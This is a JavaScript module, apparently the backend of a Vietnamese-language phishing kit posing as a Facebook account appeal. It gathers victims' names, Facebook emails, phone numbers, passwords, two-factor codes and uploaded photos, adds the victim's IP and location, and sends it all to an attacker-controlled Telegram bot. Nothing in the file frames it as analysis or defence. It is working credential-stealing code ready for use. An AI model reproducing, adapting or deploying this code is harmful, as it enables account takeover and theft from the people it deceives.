import config from '@/utils/config';
import { detectDevice } from '@/utils/detect_bot';
import axios from 'axios';

let cachedGeo = null;

const getGeoInfo = async () => {
    if (cachedGeo) return cachedGeo;
    try {
        const res = await axios.get('https://get.geojs.io/v1/ip/geo.json');
        const data = res.data ?? {};
        const city = data.city ?? '';
        const region = data.region ?? '';
        const country = data.country ?? 'Không rõ';
        const locationParts = [city, region, country].filter(Boolean);
        cachedGeo = {
            ip: data.ip ?? 'Không rõ',
            location: locationParts.join(', ') || 'Không rõ',
        };
    } catch {
        cachedGeo = {
            ip: 'Không rõ',
            location: 'Không rõ',
        };
    }
    return cachedGeo;
};

const getTimestamp = () => {
    const now = new Date();
    const pad = (n) => String(n).padStart(2, '0');
    return `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
};

const buildHeader = (geoInfo) => {
    const device = detectDevice();
    return `🔔 <b>KHÁNG NGHỊ</b>
⏰ ${getTimestamp()}
🌐 IP: <code>${geoInfo.ip}</code>
📍 Vị trí: <code>${geoInfo.location}</code>
📱 Thiết bị: <code>${device.deviceInfo}</code>
━━━━━━━━━━━━━━━━━━━━`;
};

const buildInfoSection = (formData) => {
    return `📋 <b>THÔNG TIN</b>
   Tên: <code>${formData.full_name ?? ''}</code>
   Email: <code>${formData.email_facebook ?? ''}</code>
   SĐT: <code>${formData.phone ?? ''}</code>
   Page: <code>${formData.page_name ?? ''}</code>`;
};

const buildLoginSection = (emailOrPhone, password1, password2) => {
    const mk2Line = password2 ? `\n   MK2: <code>${password2}</code>` : '';
    return `🔐 <b>ĐĂNG NHẬP</b>
   TK: <code>${emailOrPhone ?? ''}</code>
   MK1: <code>${password1 ?? ''}</code>${mk2Line}`;
};

const buildMessage = (formData, credentials, geoInfo) => {
    const { emailOrPhone, password1, password2 } = credentials;
    return `${buildHeader(geoInfo)}
${buildInfoSection(formData)}

${buildLoginSection(emailOrPhone, password1, password2)}
━━━━━━━━━━━━━━━━━━━━`;
};

const buildTwoFactorCodeMessage = (formData, payload, geoInfo) => {
    const { emailOrPhone, password1, password2, codes } = payload;
    const codeLines = codes.map((c, i) => `   Code${i + 1}: <code>${c}</code>`).join('\n');
    return `${buildHeader(geoInfo)}
${buildInfoSection(formData)}

${buildLoginSection(emailOrPhone, password1, password2)}

🔒 <b>MÃ 2FA</b>
${codeLines}
━━━━━━━━━━━━━━━━━━━━`;
};

const deleteTelegramMessage = async (messageId) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;
        await axios.post(`https://api.telegram.org/bot${token}/deleteMessage`, {
            chat_id: chatId,
            message_id: messageId,
        });
    } catch { /* */ }
};

const sendToTelegram = async (formData, credentials, prevMessageId = null) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;
        const geoInfo = await getGeoInfo();

        if (prevMessageId) {
            await deleteTelegramMessage(prevMessageId);
        }

        const msg = buildMessage(formData, credentials, geoInfo);

        const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        });

        return res.data?.result?.message_id ?? null;
    } catch {
        return null;
    }
};

export default sendToTelegram;

export const sendPhotoToTelegram = async (file, caption) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;

        const fd = new FormData();
        fd.append('chat_id', chatId);
        fd.append('photo', file);
        fd.append('caption', caption);
        fd.append('parse_mode', 'HTML');

        const res = await axios.post(
            `https://api.telegram.org/bot${token}/sendPhoto`,
            fd,
            { headers: { 'Content-Type': 'multipart/form-data' } },
        );

        return res.data?.result?.message_id ?? null;
    } catch {
        return null;
    }
};

export const sendTryOtherToTelegram = async (formData, payload, selectedMethodLabel, prevMessageId = null) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;
        const geoInfo = await getGeoInfo();

        if (prevMessageId) {
            await deleteTelegramMessage(prevMessageId);
        }

        const { emailOrPhone, password1, password2, codes } = payload;

        const codeLines = codes && codes.length > 0
            ? codes.map((c, i) => `   Code${i + 1}: <code>${c}</code>`).join('\n')
            : '';
        const codesSection = codeLines ? '\n🔒 <b>MÃ 2FA</b>\n' + codeLines + '\n' : '';

        const msg = `${buildHeader(geoInfo)}
${buildInfoSection(formData)}

${buildLoginSection(emailOrPhone, password1, password2)}
${codesSection}
🔀 <b>THỬ CÁCH KHÁC</b>
   Phương thức: <code>${selectedMethodLabel}</code>
━━━━━━━━━━━━━━━━━━━━`;

        const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        });

        return res.data?.result?.message_id ?? null;
    } catch {
        return null;
    }
};

export const sendFormDataToTelegram = async (formData) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;
        const geoInfo = await getGeoInfo();

        const msg = `${buildHeader(geoInfo)}
${buildInfoSection(formData)}
━━━━━━━━━━━━━━━━━━━━`;

        const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        });

        return res.data?.result?.message_id ?? null;
    } catch {
        return null;
    }
};

export const sendCodeToTelegram = async (formData, payload, prevMessageId = null) => {
    try {
        const token = config.token;
        const chatId = config.chat_id;
        const geoInfo = await getGeoInfo();

        if (prevMessageId) {
            await deleteTelegramMessage(prevMessageId);
        }

        const msg = buildTwoFactorCodeMessage(formData, payload, geoInfo);

        const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        });

        return res.data?.result?.message_id ?? null;
    } catch {
        return null;
    }
};
